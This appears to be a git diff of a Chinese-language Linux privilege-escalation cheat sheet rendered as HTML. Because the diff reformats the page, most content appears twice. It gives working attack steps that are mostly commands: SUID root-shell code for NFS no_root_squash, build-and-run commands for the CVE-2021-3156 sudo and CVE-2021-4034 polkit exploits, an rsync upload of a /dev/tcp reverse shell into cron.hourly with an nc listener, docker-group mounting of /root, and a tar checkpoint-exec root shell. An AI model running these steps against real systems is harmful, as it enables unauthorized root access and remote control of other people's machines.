     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>网络文件系统（<strong>NFS</strong>）是一个客户端 / 服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在 <strong>NFS</strong> 协议是几个分布式文件系统标准，网络附加存储（NAS）之一。</p>
 <p>NFS 是基于 UDP/IP 协议的应用，其实现主要是采用远程过程调用 RPC 机制，RPC 提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC 采用了 XDR 的支持。XDR 是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p>
 </blockquote>
@@ -333,228 +381,182 @@ find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &a
 <ol>
 <li>
 <p>识别nfs共享，可以利用nmap工具或rpcinfo等工具</p>
-<pre tabindex="0"><code>nmap -sV -p111,2049 IP</code></pre></li>
-</ol>
-<p>#####nmap扫描nfs的常用端口111和2049
+<pre tabindex="0"><code>nmap -sV -p111,2049 IP
+#nmap扫描nfs的常用端口111和2049
 rpcinfo -p 192.168.1.171
-#####rpcinfo直接枚举nfs</p>
-<pre tabindex="0"><code>
-2. - 检查nfs配置文件`/etc/exports`，检查开启的nsf共享目录和`no_root_squash`选项设置
+#rpcinfo直接枚举nfs</code></pre></li>
+<li>
+<ul>
+<li>
+<p>检查nfs配置文件<code>/etc/exports</code>，检查开启的nsf共享目录和<code>no_root_squash</code>选项设置</p>
+</li>
+<li>
+<p>利用metasploit或showmount列举目标主机的可用nfs exports</p>
+<pre tabindex="0"><code>msf &gt; use auxiliary/scanner/nfs/nfsmount
+msf auxiliary(nfsmount) &gt; set rhosts IP
+msf auxiliary(nfsmount) &gt; run</code></pre><pre tabindex="0"><code>showmount -e IP</code></pre></li>
+</ul>
+</li>
+<li>
+<p>挂载nfs exports</p>
+<pre tabindex="0"><code>sudo mount -o [options] -t nfs ip_address:share directory_to_mount</code></pre></li>
+<li>
+<p>编写脚本，写入想执行的命令。可以是<code>/bin/bash</code>或C语言等脚本</p>
+<p>例子：</p>
+<ul>
+<li>
+<p>C语言脚本</p>
+<pre tabindex="0"><code>#include&lt;unistd.h&gt;
+void main()
+{
+        setuid(0);
+        setgid(0);
+        system(&#34;/bin/bash&#34;);
+}</code></pre></li>
+<li>
+<p>python脚本</p>
+<pre tabindex="0"><code>/usr/bin/python3
 
-- 利用metasploit或showmount列举目标主机的可用nfs exports
+import os
+import sys
 
-  ```
-  msf &gt; use auxiliary/scanner/nfs/nfsmount
-  msf auxiliary(nfsmount) &gt; set rhosts IP
-  msf auxiliary(nfsmount) &gt; run
-  ```
+try: 
+        os.system(&#34;/bin/bash&#34;)
+except:
+        sys.exit()</code></pre></li>
+</ul>
+</li>
+<li>
+<p>chmod +s 文件添加suid权限</p>
+</li>
+</ol>
+<h1 id="sudo" class="heading-element"><span>sudo</span>
+  <a href="#sudo" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 id="cve" class="heading-element"><span>cve</span>
+  <a href="#cve" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>介绍：</p>
+<blockquote>
+<p>sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156），可导致本地权限提升。</p>
+<p>当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。</p>
+<p>影响版本：目前可验证此漏洞的linux环境只有-Ubuntu、Debian。</p>
+<p>sudo: 1.8.2 - 1.8.31p2</p>
+<p>sudo: 1.9.0 - 1.9.5p1</p>
+<p>利用脚本：https://github.com/blasty/CVE-2021-3156</p>
+</blockquote>
+<p>前提条件：已获取本地用户权限</p>
+<p>1.执行命令判断是否存在漏洞</p>
+<p>命令：sudo &ndash;version    #查看sudo版本</p>
+<p>命令：sudoedit  -s /   #执行报错则存在漏洞</p>
+<p>2.如果版本符合漏洞产生条件，就可以克隆漏洞利用项目。</p>
+<p>命令：git clone <a href="https://github.com/blasty/CVE-2021-3156.git"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/blasty/CVE-2021-3156.git</a></p>
+<p>命令：cd CVE-2021-3156  #进入项目</p>
+<p>命令：make  #编译项目</p>
+<p>命令：chmod a+x sudo-hax-me-a-sandwich   #赋予脚本执行权限</p>
+<p>3.命令：./sudo-hax-me-a-sandwich  #执行脚本，获取脚本模块编号和利用方法</p>
+<p>命令：uname -a  #查看本机系统版本信息</p>
+<p>命令：./sudo-hax-me-a-sandwich 2  #执行脚本，指定对应系统信息的模块编号</p>
+<p>执行成功后即可获取root权限。</p>
+<h1 id="环境变量" class="heading-element"><span>环境变量</span>
+  <a href="#%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>管理员编译了程序，给予了程序管理员运行的权限</p>
+<p>攻击通过对程序的运行 调试 反编译等得到了程序的运行大概逻辑</p>
+<p>尝试对程序调用的环境变量进行复制后覆盖，导致程序的加载继承权限</p>
+<p>例如某个c文件调用系统命令ps，管理员编译后给予了suid，我们就可以自创一个和原来要调用的ps可执行文件同名的文件传上去，然后把传进去的这个目录添加到环境变量，相当于完成了环境变量的覆盖</p>
+<h1 id="配置不当" class="heading-element"><span>配置不当</span>
+  <a href="#%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h1 id="rsync未授权访问覆盖" class="heading-element"><span>Rsync未授权访问覆盖</span>
+  <a href="#rsync%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e8%a6%86%e7%9b%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>介绍：Rsync是linux下一款数据备份工具，默认开启873端口。如果用户未配置账号密码就会造成未授权访问。</p>
+<p>前提条件：目标存在Rsync 未授权访问漏洞</p>
+<p>测试命令：<code>rsync rsync://ip:port</code></p>
+<p>提权：借助Linux默认计划任务调用/etc/cron.hourly，利用rsync连接上传反弹shell</p>
+<pre tabindex="0"><code>可以执行命令下载任意文件
+命令：rsync -av rsync://ip:873/src/etc/passwd ./
 
-  ```
-  showmount -e IP
-  ```
+/etc/cron.hourly是一个定时执行的计划任务,每小时的第17分钟执行一次cron.hourly。可以执行如下命令查看
+命令：rsync -av rsync://ip:873/src/etc/crontab ./crontab.txt
 
-3. 挂载nfs exports</code></pre><p>sudo mount -o [options] -t nfs ip_address:share directory_to_mount</p>
-<pre tabindex="0"><code>
-4. 编写脚本，写入想执行的命令。可以是`/bin/bash`或C语言等脚本
-
-例子：
-
-- C语言脚本
-
-  ```
-#####include&lt;unistd.h&gt;
-  void main()
-  {
-          setuid(0);
-          setgid(0);
-          system(&#34;/bin/bash&#34;);
-  }
-  ```
-
-- python脚本
-
-  ```
-  /usr/bin/python3
-  
-  import os
-  import sys
-  
-  try: 
-          os.system(&#34;/bin/bash&#34;)
-  except:
-          sys.exit()
-  ```
-
-5. chmod +s 文件添加suid权限
-
-##### sudo
-
-###### cve
-
-介绍：
-
-&gt; sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156），可导致本地权限提升。
-&gt;
-&gt; 当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。
-&gt;
-&gt; 影响版本：目前可验证此漏洞的linux环境只有-Ubuntu、Debian。
-&gt;
-&gt; sudo: 1.8.2 - 1.8.31p2
-&gt;
-&gt; sudo: 1.9.0 - 1.9.5p1
-&gt;
-&gt; 利用脚本：https://github.com/blasty/CVE-2021-3156
-
-
-
-前提条件：已获取本地用户权限
-
-1.执行命令判断是否存在漏洞
-
-命令：sudo --version    #查看sudo版本
-
-命令：sudoedit  -s /   #执行报错则存在漏洞
-
-
-
-2.如果版本符合漏洞产生条件，就可以克隆漏洞利用项目。
-
-命令：git clone https://github.com/blasty/CVE-2021-3156.git
-
-命令：cd CVE-2021-3156  #进入项目
-
-命令：make  #编译项目
-
-命令：chmod a+x sudo-hax-me-a-sandwich   #赋予脚本执行权限
-
-
-
-3.命令：./sudo-hax-me-a-sandwich  #执行脚本，获取脚本模块编号和利用方法
-
-命令：uname -a  #查看本机系统版本信息
-
-命令：./sudo-hax-me-a-sandwich 2  #执行脚本，指定对应系统信息的模块编号
-
-执行成功后即可获取root权限。
-
-
-
-
-
-
-
-##### 环境变量
-
-管理员编译了程序，给予了程序管理员运行的权限
-
-攻击通过对程序的运行 调试 反编译等得到了程序的运行大概逻辑
-
-尝试对程序调用的环境变量进行复制后覆盖，导致程序的加载继承权限
-
-例如某个c文件调用系统命令ps，管理员编译后给予了suid，我们就可以自创一个和原来要调用的ps可执行文件同名的文件传上去，然后把传进去的这个目录添加到环境变量，相当于完成了环境变量的覆盖
-
-##### 配置不当
-
-
-
-
-
-
-
-
-
-##### Rsync未授权访问覆盖
-
-介绍：Rsync是linux下一款数据备份工具，默认开启873端口。如果用户未配置账号密码就会造成未授权访问。
-
-前提条件：目标存在Rsync 未授权访问漏洞
-
-测试命令：`rsync rsync://ip:port`
-
-提权：借助Linux默认计划任务调用/etc/cron.hourly，利用rsync连接上传反弹shell</code></pre><p>可以执行命令下载任意文件
-命令：rsync -av rsync://ip:873/src/etc/passwd ./</p>
-<p>/etc/cron.hourly是一个定时执行的计划任务,每小时的第17分钟执行一次cron.hourly。可以执行如下命令查看
-命令：rsync -av rsync://ip:873/src/etc/crontab ./crontab.txt</p>
-<p>写一个含有反弹shell命令的文件
+写一个含有反弹shell命令的文件
 shell：
 /bin/bash -i &gt;&amp; /dev/tcp/监听ip/端口 0&gt;&amp;1
-chmod +x shell</p>
-<p>将shell文件上传到/etc/cron.hourly(尝试覆盖) ：
-命令：rsync -av shell rsync://目标ip/src/etc/cron.hourly</p>
-<p>设置监听，等到一个小时的17分钟时，成功获取shell
-命令：nc -nvv -lp 8888</p>
-<pre tabindex="0"><code>
+chmod +x shell
 
+将shell文件上传到/etc/cron.hourly(尝试覆盖) ：
+命令：rsync -av shell rsync://目标ip/src/etc/cron.hourly
 
-
-
-##### docker组挂载
-
-&gt; docker组的本质就是无密码root身份访问主机文件
-&gt;
-&gt; 利用命令`docker run -v /root:/mnt -it ubuntu`可以创建一个新的docker实例，以主机的`/root`目录作为系统卷启动。
-&gt;
-&gt; 容器启动后可以查看该目录内容或添加ssh密钥，更改为其他目录均可，可以结合/etc/shadow破解或添加sudoers等。
-
-介绍：利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。
-
-前提条件：已获取本地普通用户权限，且普通用户在docker组中。
-
-- 创建用户归类目录，添加到docker组
-
-    useradd -d /home/test -m  test   #创建test用户
-    passwd test    #设置密码
-    usermod -G docker test     #将test用户添加到docker组
-    newgrp docker    #更新docker用户组
-- 提权</code></pre><p>docker run -v /root:/mnt -it alpine
+设置监听，等到一个小时的17分钟时，成功获取shell
+命令：nc -nvv -lp 8888</code></pre><h1 id="docker组挂载" class="heading-element"><span>docker组挂载</span>
+  <a href="#docker%e7%bb%84%e6%8c%82%e8%bd%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><blockquote>
+<p>docker组的本质就是无密码root身份访问主机文件</p>
+<p>利用命令<code>docker run -v /root:/mnt -it ubuntu</code>可以创建一个新的docker实例，以主机的<code>/root</code>目录作为系统卷启动。</p>
+<p>容器启动后可以查看该目录内容或添加ssh密钥，更改为其他目录均可，可以结合/etc/shadow破解或添加sudoers等。</p>
+</blockquote>
+<p>介绍：利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。</p>
+<p>前提条件：已获取本地普通用户权限，且普通用户在docker组中。</p>
+<ul>
+<li>
+<p>创建用户归类目录，添加到docker组</p>
+<p>useradd -d /home/test -m  test   #创建test用户
+passwd test    #设置密码
+usermod -G docker test     #将test用户添加到docker组
+newgrp docker    #更新docker用户组</p>
+</li>
+<li>
+<p>提权</p>
+<pre tabindex="0"><code>docker run -v /root:/mnt -it alpine
 解释：从Docker上面下载alpine镜像，然后运行;
 -v将容器外部的目录/root挂载到容器内部/mnt目录，使用-it参数进入容器shell。
-命令执行完成，成功提权</p>
-<pre tabindex="0"><code>
+    命令执行完成，成功提权</code></pre></li>
+</ul>
+<h1 id="polkit" class="heading-element"><span>polkit</span>
+  <a href="#polkit" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><blockquote>
+<p>漏洞影响2009年5月至今的所有polkit版本。</p>
+<p>由于polkit是系统预装工具，所有存在polkit的<a href="https://so.csdn.net/so/search?q=linux%e7%b3%bb%e7%bb%9f&amp;spm=1001.2101.3001.7020"target="_blank" rel="external nofollow noopener noreferrer">linux系统</a>均受影响。如：CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等</p>
+</blockquote>
+<p>1.执行命令，判断是否安装了polkit</p>
+<p>命令：dpkg -l policykit-1  #有正常回显说明安装了</p>
+<p>2.执行命令，将漏洞利用项目克隆到目标目录</p>
+<p>命令：git clone <a href="https://github.com/berdav/CVE-2021-4034.git"target="_blank" rel="external nofollow noopener noreferrer">GitHub - berdav/CVE-2021-4034: CVE-2021-4034 1day</a></p>
+<p>3.执行脚本，开始提权</p>
+<p>命令：cd CVE-2021-4034/  #进入项目目录</p>
+<p>命令：make  #编译项目</p>
+<p>命令：./cve-2021-4034  #执行脚本，开始自动提权</p>
+<h1 id="通配符提权技术比较老" class="heading-element"><span>通配符提权（技术比较老）</span>
+  <a href="#%e9%80%9a%e9%85%8d%e7%ac%a6%e6%8f%90%e6%9d%83%e6%8a%80%e6%9c%af%e6%af%94%e8%be%83%e8%80%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>这里介绍tar checkpoint,类似的通配符还有<code>chown</code>和<code>rsync</code></p>
+<p>如果管理员给予了某个普通用户tar命令的超级管理员操作</p>
+<p>当以<code>root</code>权限运行<code>tar</code>时，有多种可能性可以进行提权。</p>
+<pre tabindex="0"><code>sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&#34;/bin/bash&#34;
+-c：创建新的档案文件，相当于打包（-x，相反的操作，拆包）
 
+-f：使用档名，f之后直接加档名，中间不能加其他参数
 
-##### polkit
+--checkpoint=n：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由--checkpoint-action指定
 
-&gt; 漏洞影响2009年5月至今的所有polkit版本。
-&gt;
-&gt; 由于polkit是系统预装工具，所有存在polkit的[linux系统](https://so.csdn.net/so/search?q=linux系统&amp;spm=1001.2101.3001.7020)均受影响。如：CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等
-
-1.执行命令，判断是否安装了polkit
-
-命令：dpkg -l policykit-1  #有正常回显说明安装了
-
-2.执行命令，将漏洞利用项目克隆到目标目录
-
-命令：git clone [GitHub - berdav/CVE-2021-4034: CVE-2021-4034 1day](https://github.com/berdav/CVE-2021-4034.git)
-
-3.执行脚本，开始提权
-
-命令：cd CVE-2021-4034/  #进入项目目录
-
-命令：make  #编译项目
-
-命令：./cve-2021-4034  #执行脚本，开始自动提权
-
-##### 通配符提权（技术比较老）
-
-这里介绍tar checkpoint,类似的通配符还有`chown`和`rsync`
-
-如果管理员给予了某个普通用户tar命令的超级管理员操作
-
-当以`root`权限运行`tar`时，有多种可能性可以进行提权。</code></pre><p>sudo -u root tar cf /dev/null exploit &ndash;checkpoint=1 &ndash;checkpoint-action=exec=&quot;/bin/bash&quot;
--c：创建新的档案文件，相当于打包（-x，相反的操作，拆包）</p>
-<p>-f：使用档名，f之后直接加档名，中间不能加其他参数</p>
-<p>&ndash;checkpoint=n：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由&ndash;checkpoint-action指定</p>
-<p>exec：执行外部命令</p>
-<pre tabindex="0"><code>
-
-
-###### 示例1
-
-用户可以通过`sudo`运行`tar`，且没有任何命令行参数限制
-
-```None
-test@b66231ae0dc1:~$ sudo -l
+exec：执行外部命令</code></pre><h2 id="示例1" class="heading-element"><span>示例1</span>
+  <a href="#%e7%a4%ba%e4%be%8b1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>用户可以通过<code>sudo</code>运行<code>tar</code>，且没有任何命令行参数限制</p>
+<pre tabindex="0"><code class="language-None" data-lang="None">test@b66231ae0dc1:~$ sudo -l
 User test may run the following commands on b66231ae0dc1:
     (ALL) NOPASSWD: /usr/bin/tar
 test@b66231ae0dc1:~$</code></pre><p>运行以下命令可以提权</p>
@@ -564,13 +566,13 @@ uid=1000(test) gid=1000(test) groups=1000(test)
 test@b66231ae0dc1:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/&#39; from member names
 
-##### id
+# id
 uid=0(root) gid=0(root) groups=0(root)
-#####</code></pre><h6 id="示例2" class="heading-element"><span>0.0.0.3.1  示例2</span>
+#</code></pre><h2 id="示例2" class="heading-element"><span>示例2</span>
   <a href="#%e7%a4%ba%e4%be%8b2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>用户可以通过<code>sudo</code>运行<code>tar</code>，且命令行参数包含匹配符(&rsquo;*&rsquo;) ps:常见于定时任务</p>
+</h2><p>用户可以通过<code>sudo</code>运行<code>tar</code>，且命令行参数包含匹配符(&rsquo;*&rsquo;) ps:常见于定时任务</p>
 <pre tabindex="0"><code class="language-None" data-lang="None">test@b66231ae0dc1:~$ sudo -l
 Matching Defaults entries for test on b66231ae0dc1:
     env_reset, mail_badpass,
